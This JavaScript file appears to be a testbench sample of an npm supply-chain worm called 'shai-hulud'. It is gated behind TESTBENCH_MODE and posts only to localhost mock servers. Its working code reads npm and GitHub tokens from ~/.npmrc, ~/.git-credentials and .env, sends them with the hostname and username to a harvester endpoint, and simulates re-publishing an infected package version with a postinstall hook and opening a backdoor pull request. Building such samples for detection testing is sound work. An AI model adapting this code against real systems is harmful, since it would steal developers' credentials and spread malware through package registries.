/**
 * SCAS-FP-RN-8d4f2c9a1e7b3065 © Raja Nagori
 * EDUCATIONAL EXAMPLE: Token-theft and re-publishing worm payload.
 *
 * Package name: shai-hulud
 *
 * SAFETY FEATURES:
 * - Only executes when TESTBENCH_MODE=enabled.
 * - All network traffic is sent to localhost mock servers only.
 * - No real npm or GitHub API calls are made.
 */

const fs = require('fs');
const path = require('path');
const http = require('http');
const os = require('os');

function run() {
  // Safety gate: never run the malicious path outside the testbench.
  if (process.env.TESTBENCH_MODE !== 'enabled') {
    return;
  }

  // npm sets INIT_CWD to the directory where `npm install` was invoked.
  // This is the real victim workspace even when the script runs from inside
  // node_modules/shai-hulud/.
  const projectRoot = process.env.INIT_CWD || process.cwd();

  const HARVESTER_URL = 'http://127.0.0.1:3001/collect';
  const REGISTRY_URL = 'http://127.0.0.1:3003/publish';
  const GITHUB_URL = 'http://127.0.0.1:3002/backdoor-pr';

  function readFileSafe(filePath) {
    try {
      if (fs.existsSync(filePath)) {
        return fs.readFileSync(filePath, 'utf8');
      }
    } catch (_) {
      // Ignore permission or read errors.
    }
    return null;
  }

  function postJson(url, payload) {
    return new Promise((resolve) => {
      const body = JSON.stringify(payload);
      const req = http.request(
        url,
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(body)
          }
        },
        (res) => {
          res.on('data', () => {});
          res.on('end', () => resolve(true));
        }
      );
      req.on('error', () => resolve(false));
      req.write(body);
      req.end();
    });
  }

  // 1. Harvest npm token from ~/.npmrc and the project .npmrc.
  const homeNpmrc = readFileSafe(path.join(os.homedir(), '.npmrc'));
  const projectNpmrc = readFileSafe(path.join(projectRoot, '.npmrc'));
  const npmrcSource = homeNpmrc || projectNpmrc || '';
  const npmTokenMatch = npmrcSource.match(/^_authToken=(.+)$/m) ||
    npmrcSource.match(/:_authToken=(.+)/) ||
    npmrcSource.match(/authToken=(.+)/);
  const npmToken = npmTokenMatch ? npmTokenMatch[1].trim() : null;

  // 2. Harvest GitHub token from ~/.git-credentials and the project .env.
  const homeGitCredentials = readFileSafe(path.join(os.homedir(), '.git-credentials'));
  const projectEnv = readFileSafe(path.join(projectRoot, '.env'));
  const gitCredentialsSource = homeGitCredentials || '';
  const envSource = projectEnv || '';
  const githubTokenMatch = gitCredentialsSource.match(/ghp_[A-Za-z0-9_]{30,}/) ||
    envSource.match(/GITHUB_TOKEN=(.+)/);
  const githubToken = githubTokenMatch
    ? (githubTokenMatch[0] || githubTokenMatch[1]).trim()
    : null;

  const harvestPayload = {
    scenario: '06',
    event: 'token_harvest',
    source: 'shai-hulud',
    timestamp: new Date().toISOString(),
    hostname: os.hostname(),
    username: os.userInfo().username,
    npmToken: npmToken ? `${npmToken.slice(0, 8)}...` : null,
    npmrcSource: homeNpmrc ? '~/.npmrc' : (projectNpmrc ? 'victim-app/.npmrc' : null),
    githubToken: githubToken ? `${githubToken.slice(0, 8)}...` : null,
    gitCredentialsSource: homeGitCredentials ? '~/.git-credentials' : null,
    envSource: projectEnv ? 'victim-app/.env' : null
  };

  // 3. Exfiltrate harvested tokens to the local credential harvester.
  postJson(HARVESTER_URL, harvestPayload).then(() => {
    // Optional: mirror the harvest to the Floci S3 track when enabled.
    try {
      const { uploadJson } = require('../../../detection-tools/floci/floci-exfil');
      uploadJson('06', 'token-harvest', harvestPayload);
    } catch (_) {}
  });

  // 4. Worm replication: use the stolen tokens to re-publish an infected
  // version of a package the victim maintains, and to open a backdoor PR.
  const victimPackagePath = path.join(projectRoot, 'packages', 'victim-utils', 'package.json');
  if (fs.existsSync(victimPackagePath)) {
    const victimPkg = JSON.parse(fs.readFileSync(victimPackagePath, 'utf8'));
    const versionParts = victimPkg.version.split('.').map((n) => parseInt(n, 10));
    versionParts[2] = (versionParts[2] || 0) + 1;
    const newVersion = versionParts.join('.');

    const infectedScripts = Object.assign({}, victimPkg.scripts || {}, {
      postinstall: 'node postinstall.js'
    });

    postJson(REGISTRY_URL, {
      scenario: '06',
      event: 'malicious_publish',
      package: victimPkg.name,
      version: newVersion,
      maintainer: victimPkg.author || 'victim-maintainer',
      tokenUsed: npmToken ? `npm_${npmToken.slice(0, 8)}...` : null,
      injectedScript: infectedScripts.postinstall
    });

    postJson(GITHUB_URL, {
      scenario: '06',
      event: 'backdoor_pr',
      repo: victimPkg.repository && victimPkg.repository.url
        ? victimPkg.repository.url
        : `victim-org/${victimPkg.name}`,
      branch: 'feat/dependency-bump',
      files: [
        {
          path: 'package.json',
          change: 'injected postinstall script'
        }
      ],
      tokenUsed: githubToken ? `gh_${githubToken.slice(0, 8)}...` : null
    });
  }
}

try {
  run();
} catch (_) {
  // Silent failure is typical for this style of payload.
}
